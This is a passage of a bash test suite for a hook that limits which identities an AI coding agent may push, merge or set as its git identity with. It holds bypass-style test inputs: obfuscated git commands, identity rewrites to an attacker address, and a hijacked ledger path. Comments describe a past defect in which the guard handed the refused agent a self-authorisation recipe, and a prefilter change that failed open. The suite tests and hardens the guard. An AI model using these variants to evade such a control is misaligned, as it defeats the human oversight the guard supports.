assert_rc "1 = identity resolved and NOT allow-listed"    1 mg "$TREE" "$GH_OK"  "$REPO_BAD" --command 'git push origin main'
assert_rc "2 = cannot evaluate"                           2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
assert_output "1 is labelled 'identity NOT authorised'" "identity NOT authorised" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
assert_output "2 is labelled 'CANNOT EVALUATE'" "CANNOT EVALUATE" \
  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'

t_case "AC-016 the CALLER blocks on anything non-zero and does NOT distinguish 1 from 2"
# The hook adapter is the caller. Both a refusal (1) and a cannot-evaluate (2) must reach Claude
# Code as exit 2, because exit 2 is the ONLY code that blocks a tool call in this version —
# measured, not assumed: a hook exiting 1 is a non-blocking error and the command RUNS.
assert_rc "hook: refused identity (check rc=1) -> hook exit 2"        2 \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main'
assert_rc "hook: unresolvable identity (check rc=2) -> hook exit 2"   2 \
  mg_hook "$TREE" "$GH_UNAUTH" "$REPO_OK" 'git push origin main'
assert_rc "hook: allow-listed identity -> hook exit 0"                0 \
  mg_hook "$TREE" "$GH_OK" "$REPO_OK" 'git push origin main'
assert_rc "hook: a benign command -> hook exit 0"                     0 \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'ls -la'
assert_output "the hook's block reaches the agent as readable stderr" "BLOCKED" \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main'

t_case "AC-016 a malformed hook PAYLOAD blocks (a gate that cannot read its input never passes)"
hook_raw() { ( cd "$REPO_OK" && printf '%s' "$1" | PATH="$GH_OK:$PATH" "$TREE/bin/firm-merge-guard" --hook ); }
assert_rc "empty stdin"                            2 hook_raw ''
assert_rc "not JSON at all"                        2 hook_raw 'this is not json {'
assert_rc "JSON but not an object"                  2 hook_raw '["a","b"]'
assert_rc "no tool_input object"                    2 hook_raw '{"tool_name":"Bash"}'
assert_rc "tool_input with NO command key (schema drift)" 2 hook_raw '{"tool_name":"Bash","tool_input":{"description":"d"}}'
assert_rc "command is not a string"                 2 hook_raw '{"tool_name":"Bash","tool_input":{"command":42}}'
assert_rc "a NON-Bash tool call is not this gate's surface" 0 \
  hook_raw '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'
assert_rc "an EMPTY command string has nothing to run" 0 \
  hook_raw '{"tool_name":"Bash","tool_input":{"command":""}}'

# ============================================================ AC-017 · the identity sources
t_case "AC-017 the code really runs the two sources the artifacts name"
GH_REC="$(mk_stub_gh record "$ALLOWED_LOGIN")"
assert_rc "a gated command resolves identity" 0 mg "$TREE" "$GH_REC" "$REPO_OK" --command 'git push origin main'
assert_output "it invoked exactly \`gh api user --jq .login\`" "api user --jq .login" cat "$GH_REC/gh.argv"
assert_output "and it reads git config user.email (that value decides the outcome)" \
  "git user.email  : nobody@example.com" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push'
assert_output "the script header names the gh source" "gh api user --jq .login" head -40 "$GUARD"
assert_output "the script header names the git source" "git config user.email" head -40 "$GUARD"
assert_output "the script header says user.name is NOT read" "user.name" head -40 "$GUARD"

# ============================================================ AC-018 · exactly one allowlist file
t_case "AC-018 the allowlist lives in exactly ONE data file"
assert_file "the policy file exists where the convention says" "$POLICY"
assert_ok "the allow-listed EMAILS appear in no other tracked file" python3 -c "
import os, subprocess, yaml
root = '$FIRM_ROOT'
d = yaml.safe_load(open('$POLICY'))
emails = [e for a in d['allowed'] for e in a['git_emails']]
files = subprocess.check_output(['git','-C',root,'ls-files'], text=True).split()
offenders = []
for f in files:
    if f == 'agent-firm/policy/merge-authority.yaml':
        continue
    p = os.path.join(root, f)
    try:
        text = open(p, encoding='utf-8', errors='ignore').read()
    except Exception:
        continue
    for em in emails:
        if em in text:
            offenders.append((f, em))
assert not offenders, f'allow-listed email duplicated outside the policy file: {offenders}'
"
assert_ok "the guard script contains no allow-listed login or email literal" python3 -c "
import yaml
d = yaml.safe_load(open('$POLICY'))
src = open('$GUARD').read()
bad = [v for a in d['allowed'] for v in ([a['gh_login']] + list(a['git_emails'])) if v in src]
assert not bad, f'the script hard-codes allowlist data: {bad}'
"
assert_ok "settings.json and hooks.json contain no allowlist data" python3 -c "
import yaml
d = yaml.safe_load(open('$POLICY'))
vals = [v for a in d['allowed'] for v in ([a['gh_login']] + list(a['git_emails']))]
for f in ('$SETTINGS', '$PLUGIN_HOOKS'):
    text = open(f).read()
    bad = [v for v in vals if v in text]
    assert not bad, f'{f} duplicates allowlist data: {bad}'
"
t_case "AC-018 an identity added to the FILE is honoured with a byte-identical script"
ADDED="$(mk_guard_tree)"
assert_eq "the scratch guard is byte-identical to the shipped one" "" \
  "$(cmp "$ADDED/bin/firm-merge-guard" "$GUARD" 2>&1)"
assert_rc "before the edit: a brand-new identity is refused" 1 \
  mg "$ADDED" "$(mk_stub_gh login brand-new-operator)" "$(mk_id_repo brand-new@example.com)" \
  --command 'git push origin main'
printf 'schema_version: 1\nallowed:\n  - gh_login: brand-new-operator\n    git_emails:\n      - brand-new@example.com\n' \
  > "$ADDED/agent-firm/policy/merge-authority.yaml"
assert_rc "after a ONE-FILE edit: the same identity is permitted" 0 \
  mg "$ADDED" "$(mk_stub_gh login brand-new-operator)" "$(mk_id_repo brand-new@example.com)" \
  --command 'git push origin main'
assert_eq "and the script was never touched" "" \
  "$(cmp "$ADDED/bin/firm-merge-guard" "$GUARD" 2>&1)"

# ============================================================ AC-019 · no overclaim
t_case "AC-019 every artifact states the control is client-side and bypassable"
ENFORCEMENT="$FIRM_ROOT/docs/ENFORCEMENT.md"
RUNBOOK="$FIRM_ROOT/docs/BRANCH-PROTECTION-RUNBOOK.md"
# The disclosure is asserted on NORMALISED text — lowercased, with markdown emphasis stripped —
# because the same sentence legitimately appears as "CLIENT-SIDE", "client-side" and
# "**not** a security boundary" across a shell header, a YAML comment and two markdown files.
# Normalising the haystack keeps the assertion strict about the CLAIM while not being a spelling
# test; the phrases themselves are still required verbatim after normalisation.
disclosure_check() {   # $1 = file, $2 = required phrase (already normalised)
  python3 -c "
import re, sys
text = open(sys.argv[1], encoding='utf-8').read().lower().replace('*', '')
text = re.sub(r'\s+', ' ', text)
sys.exit(0 if sys.argv[2] in text else 1)
" "$1" "$2"
}
for f in "$GUARD" "$POLICY" "$ENFORCEMENT" "$RUNBOOK"; do
  b="$(basename "$f")"
  assert_ok "$b says the control is client-side"          disclosure_check "$f" "client-side"
  assert_ok "$b says it is bypassable"                    disclosure_check "$f" "bypassable"
  assert_ok "$b denies being a security boundary"         disclosure_check "$f" "not a security boundary"
  assert_ok "$b names who can bypass it (repo write access)" disclosure_check "$f" "repo write access"
done
# The SCRIPT HEADER specifically must carry the disclosure — not merely the file somewhere. Mutation
# testing caught this: stripping the disclosure from the header left the whole-file assertion green,
# because the same phrase also appears in the runtime block message 300 lines lower. AC-019 names
# the header, so the header is what gets asserted.
python3 -c "
lines = open('$GUARD').readlines()
end = next(i for i, l in enumerate(lines) if l.startswith('set -uo pipefail'))
open('$SCRATCH_HEADER', 'w').write(''.join(lines[:end]))
"
assert_ok "the HEADER (first 60 lines) says client-side"        disclosure_check "$SCRATCH_HEADER" "client-side"
assert_ok "the HEADER says bypassable"                          disclosure_check "$SCRATCH_HEADER" "bypassable"
assert_ok "the HEADER denies being a security boundary"         disclosure_check "$SCRATCH_HEADER" "not a security boundary"
assert_ok "the HEADER denies being branch protection"           disclosure_check "$SCRATCH_HEADER" "not branch protection"
assert_ok "the HEADER denies providing a required PR review"    disclosure_check "$SCRATCH_HEADER" "cannot provide a \"required pr review\""
assert_ok "the HEADER names the four bypass routes"             disclosure_check "$SCRATCH_HEADER" "repo write access"
# And the RUNTIME message must carry it too, independently of the header — an agent that is blocked
# reads the message, not the source.
assert_output "the runtime block message repeats it" "not a security boundary" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
assert_output "the runbook says only GitHub can require a review" "only GitHub" cat "$RUNBOOK"
assert_ok "no artifact claims the control IS branch protection or a security boundary" python3 -c "
import re
forbidden = [
    r'is a security boundary',
    r'provides branch protection',
    r'is branch protection(?! )',
    r'enforces (?:a )?required (?:PR |pull request )?review',
    r'server-side enforcement of the identity',
]
for path in ['$GUARD', '$POLICY', '$ENFORCEMENT', '$RUNBOOK']:
    text = open(path, encoding='utf-8').read()
    for pat in forbidden:
        for m in re.finditer(pat, text, re.I):
            s = max(0, m.start()-60)
            ctx = text[s:m.end()+20].replace(chr(10), ' ')
            # A negated mention ('is NOT a security boundary') is exactly what we want to see.
            if re.search(r'\b(not|never|cannot|no)\b[^.]{0,40}\$', text[s:m.start()], re.I):
                continue
            raise AssertionError(f'{path}: overclaim {pat!r} in: ...{ctx}...')
print('ok')
"

# ============================================================ AC-021 · observable, actionable
t_case "AC-021 a block is recorded in the ledger AND explained in the message"
LREPO="$(mk_id_repo nobody@example.com)"
mk_run "$LREPO" "20260803T000000Z-guard-test"
assert_rc "the blocked command exits non-zero" 1 mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
LEDGER="$LREPO/.agent-firm/runs/20260803T000000Z-guard-test/run.jsonl"
assert_file "run.jsonl was created" "$LEDGER"
assert_ok "the event names the refused command, the matched surface and BOTH identities" python3 -c "
import json
recs = [json.loads(l) for l in open('$LEDGER') if l.strip()]
blocks = [r for r in recs if r.get('event') == 'merge_guard_block']
assert blocks, f'no merge_guard_block event in {recs}'
b = blocks[-1]
assert b['cmd'] == 'git push origin main', b
assert b['matched'] == 'git push', b
assert b['decision'] == 'refused', b
assert b['gh_login'] == '$ALLOWED_LOGIN', b
assert b['git_email'] == 'nobody@example.com', b
assert b['git_status'] == 'ok' and b['gh_status'] == 'ok', b
assert b['exit'] == 1, b
assert b['ts'].endswith('Z'), b
"
assert_output "the message says WHICH check failed" "NOT allow-listed" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "the message names the refused command" "refused command : git push origin main" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "the message names the allowlist file to edit" "merge-authority.yaml" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "the message gives the legitimate way to proceed" "ask the human operator" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "the message repeats the client-side caveat" "CLIENT-SIDE" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'

t_case "AC-021/SEC-04 the block message names the problem and does NOT dictate the bypass"
# TEST CHANGE, RECORDED DELIBERATELY. Two assertions used to live here:
#     "the message offers the exact git config remedy"  -> needle 'git config --global user.email'
#     "the remedy names an email read FROM the allowlist" -> needle "$ALLOWED_EMAIL"
# They pinned a DEFECT, not a behaviour: they required the guard to print a runnable
# self-authorisation command to the actor it had just refused. They are replaced — not deleted — by
# the inverse assertion plus the assertions that the message is still ACTIONABLE. That combination
# is strictly stronger: the old pair could not have failed if the guard printed the recipe AND the
# recipe was un-gated, which is exactly the state the review found.
#
# The allowlist CONTENTS are still printed, on purpose. The allowlist PATH is printed too and that
# file is plainly readable, so redacting the values it contains would be theatre; what mattered was
# the imperative, and the write itself, both of which are now handled.
assert_not_output "no runnable \`git config ... user.email\` recipe is printed" \
  "git config --global user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_not_output "  nor the --local spelling" \
  "git config --local user.email " mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "instead it names the problem" \
  "The git identity configured in this working tree is not an authorised one" \
  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "  and says re-authoring your own identity is itself gated" \
  "DO NOT re-author your own identity" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "  and it is still actionable for a legitimately mis-configured operator" \
  "that repair belongs to the human operator" \
  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "  the diagnostic still shows WHAT is allow-listed (the file is readable anyway)" \
  "$ALLOWED_EMAIL" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
assert_output "  and the file to edit to authorise a NEW identity" "merge-authority.yaml" \
  mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
# The other half of the fix, asserted from the message side: what the message declines to tell the
# agent, the surface also refuses to run. Both halves, or neither is worth anything.
assert_rc "  and the command the old message printed is on the gated surface" 1 \
  mg "$TREE" "$GH_OK" "$LREPO" --command "git config --global user.email $ALLOWED_EMAIL"
# An UNSET identity gets the same treatment: no recipe, but a stated route.
assert_not_output "the unset-identity branch prints no recipe either" \
  "git config --global user.email" mg_noid --command 'git push origin main'
assert_output "  and states who has to fix it" "the human operator has to do it" \
  mg_noid --command 'git push origin main'

t_case "AC-021 an INDETERMINATE block is recorded too, and says which source failed"
IREPO="$(mk_id_repo "$ALLOWED_EMAIL")"
mk_run "$IREPO" "20260803T000001Z-guard-test"
assert_rc "cannot-evaluate exits 2" 2 mg "$TREE" "$GH_UNAUTH" "$IREPO" --command 'git merge x'
assert_ok "the event records cannot_evaluate and the unresolved source" python3 -c "
import json
p='$IREPO/.agent-firm/runs/20260803T000001Z-guard-test/run.jsonl'
recs=[json.loads(l) for l in open(p) if l.strip()]
b=[r for r in recs if r.get('event')=='merge_guard_block'][-1]
assert b['decision']=='cannot_evaluate', b
assert b['gh_status']=='gh-failed', b
assert b['git_status']=='ok', b
assert b['exit']==2, b
"
t_case "AC-021 a PERMIT is recorded too, so an authorised merge is visible in the ledger"
PREPO="$(mk_id_repo "$ALLOWED_EMAIL")"
mk_run "$PREPO" "20260803T000002Z-guard-test"
assert_rc "permitted" 0 mg "$TREE" "$GH_OK" "$PREPO" --command 'git merge feature/x'
assert_ok "the permit event names the identity that authorised it" python3 -c "
import json
p='$PREPO/.agent-firm/runs/20260803T000002Z-guard-test/run.jsonl'
recs=[json.loads(l) for l in open(p) if l.strip()]
g=[r for r in recs if r.get('event')=='merge_guard_permit'][-1]
assert g['decision']=='permitted' and g['matched']=='git merge', g
assert g['gh_login']=='$ALLOWED_LOGIN', g
"
t_case "AC-021/SEC-11 the ledger append is confined to the project (CURRENT_RUN is data)"
# ledger() reads a DIRECTORY PATH out of .agent-firm/CURRENT_RUN and appends JSON there. Anything
# able to write that file could steer the appends into any existing directory. It cannot change the
# decision, but a gate's own audit trail is not somewhere to accept a steer from a writable file.
# BOTH axes are varied, because a containment check that simply disabled the ledger would satisfy
# the negative assertion on its own: outside the project -> no write; inside -> write.
OUTREPO="$(mk_id_repo nobody@example.com)"
ELSEWHERE="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-elsewhere.XXXXXX")"; t_track "$ELSEWHERE"
mkdir -p "$ELSEWHERE/runs/hijacked" "$OUTREPO/.agent-firm"
printf '%s\n' "$ELSEWHERE/runs/hijacked" > "$OUTREPO/.agent-firm/CURRENT_RUN"
assert_rc "an out-of-project CURRENT_RUN does not change the decision" 1 \
  mg "$TREE" "$GH_OK" "$OUTREPO" --command 'git push origin main'
assert_no_file "  and nothing was appended outside the project" "$ELSEWHERE/runs/hijacked/run.jsonl"
INREPO="$(mk_id_repo nobody@example.com)"
mk_run "$INREPO" "20260803T000030Z-contained"
assert_rc "an in-project CURRENT_RUN still records the block" 1 \
  mg "$TREE" "$GH_OK" "$INREPO" --command 'git push origin main'
assert_file "  and the in-project run.jsonl DID receive the event" \
  "$INREPO/.agent-firm/runs/20260803T000030Z-contained/run.jsonl"

t_case "AC-021 a non-gated command writes NO guard event (the ledger stays readable)"
NREPO="$(mk_id_repo nobody@example.com)"
mk_run "$NREPO" "20260803T000003Z-guard-test"
assert_rc "benign command permitted" 0 mg "$TREE" "$GH_OK" "$NREPO" --command 'ls -la'
assert_no_file "no run.jsonl was written at all" "$NREPO/.agent-firm/runs/20260803T000003Z-guard-test/run.jsonl"

# ============================================================ AC-022 · performance
t_case "AC-022 identity is resolved ONLY for a matching command"
# The stubs here FAIL LOUDLY if executed, so a passing assertion is positive proof that the benign
# path spawns neither gh, nor git, nor python3 — not merely that it returned 0.
EXPLODE="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-explode.XXXXXX")"; t_track "$EXPLODE"
for b in gh git python3; do
  printf '#!/bin/sh\necho "STUB-%s-WAS-EXECUTED" >&2\nexit 99\n' "$b" > "$EXPLODE/$b"
  chmod +x "$EXPLODE/$b"
done
for c in 'ls -la' 'cat README.md' 'git status' 'echo hello'; do
  assert_rc "benign: $c exits 0 with gh/git/python3 booby-trapped" 0 \
    mg "$TREE" "$EXPLODE" "$REPO_OK" --command "$c"
  assert_eq "benign: $c spawned NO subprocess at all" "" \
    "$(mg "$TREE" "$EXPLODE" "$REPO_OK" --command "$c" 2>&1)"
done
# QUOTE-BEARING benign commands stay on the zero-subprocess path. This matters because the SEC-03
# fix could have been implemented as "fall through to python whenever the string contains a quote",
# which would have moved most real Bash calls onto a python3 start (~35 ms x2 per call). Instead the
# quotes are DELETED in bash with parameter expansion and the substring test runs on the result, so
# a quoted command with no trigger word is still decided with zero subprocesses.
for c in 'echo "hello world"' "printf '%s\\n' done" 'grep -n "TODO" README.md' \
         'cat "some file.txt"' 'awk -F, "{print \$1}" data.csv'; do
  assert_rc "benign+quoted: $c exits 0" 0 mg "$TREE" "$EXPLODE" "$REPO_OK" --command "$c"
  assert_eq "benign+quoted: $c spawned NO subprocess" "" \
    "$(mg "$TREE" "$EXPLODE" "$REPO_OK" --command "$c" 2>&1)"
done
# And the normalisation is really doing work: the SAME booby-trapped PATH BLOCKS a quote-split
# trigger word, which proves the string reached python rather than being filtered out in bash.
assert_rc "a quote-split trigger word reaches the classifier (blocks under a dead PATH)" 2 \
  mg "$TREE" "$EXPLODE" "$REPO_OK" --command 'git pus\h origin main'
assert_rc "and the booby-trapped PATH still BLOCKS a gated command (not a silent pass)" 2 \
  mg "$TREE" "$EXPLODE" "$REPO_OK" --command 'git push origin main'
t_case "AC-022 the same holds through the hook adapter, on a real payload"
hook_explode() { ( cd "$REPO_OK" && printf '%s' "$(mk_payload "$1")" | PATH="$EXPLODE:$PATH" "$TREE/bin/firm-merge-guard" --hook ); }
assert_rc "hook + benign command -> 0" 0 hook_explode 'ls -la'
assert_eq "hook + benign command spawned no gh/git/python3" "" "$(hook_explode 'ls -la' 2>&1)"

# ============ AC-022/AC-015/SEC-02 · THE TWO PREFILTERS ARE PINNED TO EACH OTHER
# WHY THIS IS THE MOST IMPORTANT TEST IN THIS FILE. There are TWO prefilters — a bash one
# (`_mg_may_match`) and a jq one embedded in the hook adapter — and they are not interchangeable:
# the jq one is used when jq is present, the BASH one is what hook mode falls back to when jq is
# ABSENT, which the script explicitly supports. So a clause present in one and missing from the
# other is not a style inconsistency, it is a per-host difference in what the gate covers.
#
# That is not hypothetical. An uncommitted change removed the `git`+`config` clause from
# `_mg_may_match` ONLY, leaving the jq copy intact. On a host with jq nothing looked wrong; on a
# jq-less host it deleted the entire SEC-04 identity-write gate from the ENFORCEMENT surface,
# because a SKIP verdict exits 0 before python3 is ever reached. A fail-open, invisible on the
# machine it was written on, and no test could see it. The diff is kept at
# 09-test-evidence/wo-c-discarded-wip-config-prefilter-revert.diff.
#
# So both prefilters are EXTRACTED FROM THE SHIPPED SCRIPT (not re-implemented here — a copy would
# drift and prove nothing) and driven over one fixed corpus. Three properties are asserted:
#   1. Each prefilter gives the verdict the table declares. A clause deleted from EITHER side flips
#      rows to SKIP and fails; a clause loosened flips benign rows to CHECK and fails.
#   2. Every row marked `gated` is CHECK in BOTH — no prefilter may drop a command the classifier
#      gates — AND the guard really does gate it. That second half is what stops the table itself
#      from being edited to hide a hole: weaken a `gated` row's expectation to SKIP and the guard
#      assertion on the same row goes red.
#   3. NO row is CHECK in bash but SKIP in jq. jq is the surface that runs when jq exists, so it
#      must never be the weaker of the two. The reverse (jq stricter) is allowed, and the only
#      rows where it happens are declared `divergent` below with the reason.
t_case "AC-022/SEC-02 the bash and jq prefilters agree on a fixed corpus"
assert_ok "precondition: jq IS on PATH (without it this whole case would prove only half)" \
  sh -c 'command -v jq'
PFDIR="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-prefilter.XXXXXX")"; t_track "$PFDIR"
assert_ok "both prefilters can be extracted from the SHIPPED script (not re-implemented here)" \
  python3 -c "
import re
src = open('$GUARD').read()
m = re.search(r'^_mg_may_match\(\) \{\n(.*?)^\}\$', src, re.S | re.M)
assert m, 'could not extract _mg_may_match from the guard'
open('$PFDIR/may.sh', 'w').write(
    '#!/usr/bin/env bash\n_mg_may_match() {\n' + m.group(1) + '}\n'
    'if _mg_may_match \"\$1\"; then echo CHECK; else echo SKIP; fi\n')
j = re.search(r\"\| jq -r '\n(.*?)'\s*2>/dev/null\", src, re.S)
assert j, 'could not extract the jq prefilter program from the guard'
prog = j.group(1)
assert 'tool_input' in prog and 'SKIP' in prog and 'CHECK' in prog, prog[:200]
open('$PFDIR/pre.jq', 'w').write(prog)
"
PF_BAD_DIRECTION=0
# pf_row <kind> <expect-bash> <expect-jq> <string>
pf_row() {
  local kind="$1" eb="$2" ej="$3" s="$4" ab aj
  ab="$(bash "$PFDIR/may.sh" "$s" 2>/dev/null)"
  aj="$(printf '%s' "$(mk_payload "$s")" | jq -r -f "$PFDIR/pre.jq" 2>/dev/null || printf 'CHECK')"
  assert_eq "prefilter[bash] wants $eb · $kind · $s" "$eb" "$ab"
  assert_eq "prefilter[jq]   wants $ej · $kind · $s" "$ej" "$aj"
  if [ "$ab" = "CHECK" ] && [ "$aj" = "SKIP" ]; then
    PF_BAD_DIRECTION=$((PF_BAD_DIRECTION+1))
    _t_no "jq is WEAKER than the bash fallback for: $s" \
          "jq runs whenever jq exists, so it must never SKIP what bash would CHECK"
  fi
  if [ "$kind" = "gated" ]; then
    assert_eq "  gated rows must be CHECK in BOTH (neither may drop a gated command) · $s" \
      "CHECK CHECK" "$eb $ej"
    assert_rc "  ...and the guard really gates it, so the row above cannot be edited to hide it" 1 \
      mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$s"
  fi
}
# ---- GATED. Every one of these is asserted to BLOCK elsewhere in this file. Both prefilters must
# let them through to the classifier. `git config --global user.email ...` is the exact string the
# discarded WIP would have SKIPped in bash while jq still CHECKed it.
pf_row gated  CHECK CHECK 'git push origin main'
pf_row gated  CHECK CHECK 'git merge feature'
pf_row gated  CHECK CHECK 'git pull origin main'
pf_row gated  CHECK CHECK 'gh pr merge 12'
pf_row gated  CHECK CHECK 'git config --global user.email attacker@example.com'
pf_row gated  CHECK CHECK 'git config user.email a@b.c'
pf_row gated  CHECK CHECK 'git config set user.email a@b.c'
pf_row gated  CHECK CHECK 'git config --unset user.email'
pf_row gated  CHECK CHECK 'git -C /tmp/other config user.email a@b.c'
pf_row gated  CHECK CHECK '/usr/bin/git --no-pager config --global user.name Somebody'
pf_row gated  CHECK CHECK "git \$'config' --global user.email a@b.c"
pf_row gated  CHECK CHECK "git 'con'fig user.email a@b.c"
pf_row gated  CHECK CHECK "bash -ec 'git config --global user.email a@b.c'"
pf_row gated  CHECK CHECK 'sudo -u git git config --global user.email a@b.c'
pf_row gated  CHECK CHECK 'git pus\h origin main'
pf_row gated  CHECK CHECK 'gh api -XPUT repos/o/r/git/refs/heads/main'
pf_row gated  CHECK CHECK 'git subtree push --prefix=d origin main'
pf_row gated  CHECK CHECK 'cat <(git push origin main)'
pf_row gated  CHECK CHECK "busybox sh -c 'git push origin main'"
# ---- BENIGN, and on the zero-subprocess path in BOTH. These are the AC-022 win: the ordered
# `git`-then-`config` clause returns them here. Before it, every one containing both words in ANY
# order cost a python3 start (~40 ms, doubled by the two hook registrations).
pf_row benign SKIP  SKIP  'ls -la'
pf_row benign SKIP  SKIP  'cat README.md'
pf_row benign SKIP  SKIP  'echo hello'
pf_row benign SKIP  SKIP  'git status --porcelain'
pf_row benign SKIP  SKIP  'git log --oneline -5'
pf_row benign SKIP  SKIP  'git add -A'
pf_row benign SKIP  SKIP  'git commit -qm seed'
pf_row benign SKIP  SKIP  'git diff --stat'
pf_row benign SKIP  SKIP  'grep -rn config .github/'
pf_row benign SKIP  SKIP  'cat docs/config.md'
pf_row benign SKIP  SKIP  'python3 -c "import configparser"'
pf_row benign SKIP  SKIP  'cat .github/workflows/ci.yml'
pf_row benign SKIP  SKIP  'ls config git'
pf_row benign SKIP  SKIP  'echo GitHub'
pf_row benign SKIP  SKIP  'sed -i "" s/a/b/ file.txt'
pf_row benign SKIP  SKIP  'awk -F, "{print \$1}" data.csv'
# ---- STILL CHECK, and honestly so. `git` DOES precede `config` here, so the ordered clause cannot
# tell these from a real `git ... config` write without a parse. They cost one python3 start and are
# then resolved to PERMIT structurally. Narrowing further — e.g. demanding whitespace before
# `config` — would SKIP `git \$'config' user.email <v>`, which IS gated. The clause errs toward
# CHECK, which costs milliseconds; erring the other way costs the gate.
pf_row benign CHECK CHECK 'cat .git/config'
pf_row benign CHECK CHECK 'ls -la ~/.gitconfig'
pf_row benign CHECK CHECK 'git config --get user.email'
# ---- DECLARED DIVERGENCES. jq is the STRICTER side in both, which is the safe direction: it runs
# whenever jq is present. Listed so that any NEW divergence — in either direction — fails above.
#   · jq tests bare `gh` case-insensitively; bash requires `gh ` or `gh<TAB>`. So "high" CHECKs in jq.
#   · jq's push|merge|pull test is case-insensitive; bash enumerates only push/Push/PUSH.
# Neither can be fixed cheaply on the bash side: bash 3.2 has no `${v,,}` and lowercasing costs a
# subprocess, which is the one thing this prefilter exists to avoid.
pf_row divergent SKIP CHECK 'echo "effort level high"'
pf_row divergent SKIP CHECK 'echo pUsh'
pf_row divergent SKIP CHECK 'echo MeRgE'
assert_eq "NO corpus row has jq weaker than the bash fallback (checked on every row above)" \
  "0" "$PF_BAD_DIRECTION"
# And the ordered clause is really ordered, in BOTH copies — asserted on the source as well as on
# behaviour, because "config before git" is the property the tightening turns on.
assert_ok "both copies of the git/config clause require git BEFORE config" python3 -c "
import re
src = open('$GUARD').read()
bash_fn = re.search(r'^_mg_may_match\(\) \{\n(.*?)^\}\$', src, re.S | re.M).group(1)
assert '*git*config*' in bash_fn, 'the bash clause is not the ordered form: ' + bash_fn
assert '*config*' not in bash_fn.replace('*git*config*', ''), (
    'an unordered *config* clause is back in _mg_may_match: ' + bash_fn)
jq = re.search(r\"\| jq -r '\n(.*?)'\s*2>/dev/null\", src, re.S).group(1)
assert re.search(r'test\(\"git\[.*?\]\*config\"\)', jq), 'the jq clause is not the ordered form: ' + jq
assert 'test(\"config\")' not in jq, 'an unordered config test is back in the jq program'
print('ok')
"

# ============================================================ AC-023 · the ledger hook survives
t_case "AC-023 the pre-existing PreToolUse ledger behaviour is unchanged"
HREPO="$(mk_repo)"
mk_run "$HREPO" "20260803T000010Z-ledger"
HLEDGER="$HREPO/.agent-firm/runs/20260803T000010Z-ledger/run.jsonl"
assert_ok "firm-ledger-hook still exits 0 on an ordinary command" \
  sh -c "cd '$HREPO' && printf '%s' '$(mk_payload "ls -la")' | '$BIN/firm-ledger-hook'"
assert_ok "and it appended a bash event naming the command" python3 -c "
import json
recs=[json.loads(l) for l in open('$HLEDGER') if l.strip()]
assert any(r.get('event')=='bash' and r.get('cmd')=='ls -la' for r in recs), recs
"
assert_ok "it still exits 0 for a command the GUARD refuses (the block is still recorded)" \
  sh -c "cd '$HREPO' && printf '%s' '$(mk_payload "git push origin main")' | '$BIN/firm-ledger-hook'"
assert_ok "  and that refused command is in the ledger" python3 -c "
import json
recs=[json.loads(l) for l in open('$HLEDGER') if l.strip()]
assert any(r.get('event')=='bash' and r.get('cmd')=='git push origin main' for r in recs), recs
"
assert_ok "a failure in the LEDGER path cannot fail a tool call (garbage stdin)" \
  sh -c "cd '$HREPO' && printf 'not json' | '$BIN/firm-ledger-hook'"
assert_ok "  (no active run at all)" \
  sh -c "cd '$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-norun.XXXXXX")' && printf '{}' | '$BIN/firm-ledger-hook'"

t_case "AC-023 BOTH hook surfaces are wired, ledger FIRST, guard added not substituted"
assert_ok "settings.json (project mode) keeps the ledger hook and adds the guard" python3 -c "
import json
d = json.load(open('$SETTINGS'))
pre = d['hooks']['PreToolUse']
bash = [e for e in pre if e.get('matcher') == 'Bash']
assert len(bash) == 1, pre
cmds = [h['command'] for h in bash[0]['hooks']]
assert len(cmds) == 2, cmds
assert 'firm-ledger-hook' in cmds[0], cmds
assert 'firm-merge-guard' in cmds[1] and '--hook' in cmds[1], cmds
assert 'CLAUDE_PROJECT_DIR' in cmds[1], cmds
"
assert_ok "hooks.json (plugin mode) keeps the ledger hook and adds the guard" python3 -c "
import json
d = json.load(open('$PLUGIN_HOOKS'))
bash = [e for e in d['hooks']['PreToolUse'] if e.get('matcher') == 'Bash']
assert len(bash) == 1, d
cmds = [h['command'] for h in bash[0]['hooks']]
assert len(cmds) == 2, cmds
assert 'firm-ledger-hook' in cmds[0], cmds
assert 'firm-merge-guard' in cmds[1] and '--hook' in cmds[1], cmds
assert 'CLAUDE_PLUGIN_ROOT' in cmds[1], cmds
"
assert_ok "the Notification hook is untouched" python3 -c "
import json
d = json.load(open('$PLUGIN_HOOKS'))
n = d['hooks']['Notification'][0]['hooks'][0]['command']
assert 'firm-notify' in n, n
"

# ============================================================ AC-024 · the firm's own fixtures
t_case "AC-024 the firm's own scratch repos and tooling are not false-positived"
# tests/lib.sh:mk_repo sets user.email test@agent-firm.local, test-bench-record and firm-run-evals
# do the same with their own values. None of them is allow-listed — and none of them should ever
# reach identity resolution, because none of the commands the firm's tooling issues is on the
# gated surface. That is the difference between "the gate is off in tests" (which would be a hole)
# and "the gate never sees these commands" (which is correct).
